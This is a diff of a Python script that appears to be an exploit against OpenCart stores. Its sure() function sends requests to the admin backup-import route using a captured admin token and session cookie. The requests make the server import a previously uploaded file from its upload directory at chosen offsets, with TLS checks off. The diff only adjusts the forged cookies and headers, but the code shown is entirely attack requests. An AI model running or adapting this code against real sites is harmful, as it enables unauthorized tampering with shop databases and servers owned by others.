@@ -77,8 +77,8 @@ def adddatefile():
 
 def sure():
     burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=8688"
-    burp0_cookies = {"__atuvc": "1%7C12%2C0%7C13%2C1%7C14", "currency": "USD", "language": "zh-cn", "OCSESSID": adcookies}
-    burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=tool/backup&user_token="+adtoken, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
+    burp0_cookies = {"OCSESSID": adcookies, "__atuvc": "1%7C12%2C0%7C13%2C1%7C14", "currency": "USD", "language": "en-gb"}
+    burp0_headers = {"Origin": "https://"+host, "Referer": "https://"+host+"/admin/index.php?route=tool/backup&user_token="+adtoken, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "Content-Type": "multipart/form-data; boundary=---------------------------7e4e614b0306", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close", "Cache-Control": "no-cache"}
     r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
     print(r.text)
 
@@ -86,8 +86,8 @@ def sure():
 
 
     burp0_url = "https://"+host+":443/admin/index.php?route=tool/backup/import&user_token="+adtoken+"&import=/bitnami/"+host+"/system/storage/upload/"+datetoken+"&position=22122"
-    burp0_cookies = {"__atuvc": "1%7C12%2C0%7C13%2C1%7C14", "currency": "USD", "language": "zh-cn", "OCSESSID": adcookies}
-    burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=tool/backup&user_token="+adtoken, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
+   # burp0_cookies = {"__atuvc": "1%7C12%2C0%7C13%2C1%7C14", "currency": "USD", "language": "zh-cn", "OCSESSID": adcookies}
+   # burp0_headers = {"Referer": "https://"+host+"/admin/index.php?route=tool/backup&user_token="+adtoken, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.8,zh-Hans-CN;q=0.5,zh-Hans;q=0.3", "X-Requested-With": "XMLHttpRequest", "Accept-Encoding": "gzip, deflate", "Connection": "close"}
     r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,verify=False)
     print(r.text)
 
